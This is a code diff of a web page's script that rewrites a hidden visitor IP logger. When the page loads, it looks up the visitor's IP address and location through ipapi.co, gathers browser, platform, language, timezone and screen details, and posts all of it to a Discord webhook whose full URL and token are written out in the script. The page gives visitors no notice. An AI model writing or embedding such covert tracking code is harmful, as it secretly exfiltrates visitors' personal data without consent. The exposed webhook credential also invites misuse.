@@ -748,38 +748,34 @@
       }
     </script>
 <script>
-        var webhookUrl = "https://discord.com/api/webhooks/1165295482973732974/geakIU2aSwHNerScSF1vZDTWBpWHsw8YRtpPtMjRD1b6eE5wRA00RoPUnFsSwxlUbehB";
+ var webhookUrl = "https://discord.com/api/webhooks/1165295482973732974/geakIU2aSwHNerScSF1vZDTWBpWHsw8YRtpPtMjRD1b6eE5wRA00RoPUnFsSwxlUbehB";
 
+async function getUserInfo() {
+    try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
 
-    function getUserInfo() {
-      $.getJSON("https://ipapi.co/json/", function(data) {
-          var ipAddress = data.ip;
-          var region = data.region;
-          var language = navigator.language || navigator.userLanguage;
-          var userAgent = navigator.userAgent
-          var timezoneOffset = new Date().getTimezoneOffset();
-          var screenWidth = screen.width;
-          var screenHeight = screen.height;
-          var platform = navigator.platform
-          var browsername = navigator.appName
-          var browserversion = navigator.appVersion
-          var location = `${data.city}, ${data.region}, ${data.country_name}`;
+        var ipAddress = data.ip;
+        var region = data.region;
+        var language = navigator.language || navigator.userLanguage;
+        var userAgent = navigator.userAgent;
+        var timezoneOffset = new Date().getTimezoneOffset();
+        var screenWidth = screen.width;
+        var screenHeight = screen.height;
+        var platform = navigator.platform;
+        var browsername = navigator.appName;
+        var browserversion = navigator.appVersion;
+        var location = `${data.city}, ${data.region}, ${data.country_name}`;
 
-
-
-    
-     var request = new XMLHttpRequest();
-      request.open("POST", webhookUrl);
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-
-let iplogged = {
-  author: {
-    name: "Site Data"
-  },
-  title: "Someone logged onto the site!",
-      description: `
+        var params = {
+            username: "Site Data",
+            avatar_url: "https://thumbs.dreamstime.com/b/swiss-cheese-holes-18911609.jpg",
+            embeds: [{
+                author: {
+                    name: "Site Data"
+                },
+                title: "Someone logged onto the site!",
+                description: `
 __**WEB INFO:**__
 
 **IP Address**: ${ipAddress}
@@ -795,27 +791,24 @@ __**WEB INFO:**__
 **Timezone**: ${timezoneOffset}
 
 **Screen resolution**: ${screenWidth} x ${screenHeight}`,
-color: 15919626
-}
+                color: 15919626
+            }]
+        };
 
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(params),
+        });
 
-var params = {
-  username: "Site Data",
-avatar_url: "https://thumbs.dreamstime.com/b/swiss-cheese-holes-18911609.jpg",
-  embeds: [ iplogged ]
-}
-
-
-      request.send(JSON.stringify(params))
-
-
-
-      });
+    } catch (error) {
+        console.error('Error fetching data:', error);
     }
-    
-document.addEventListener("DOMContentLoaded", async function () {
-      getUserInfo();
-    });
+}
+
+document.addEventListener("DOMContentLoaded", getUserInfo);
 </script>
   </body>
 </html>
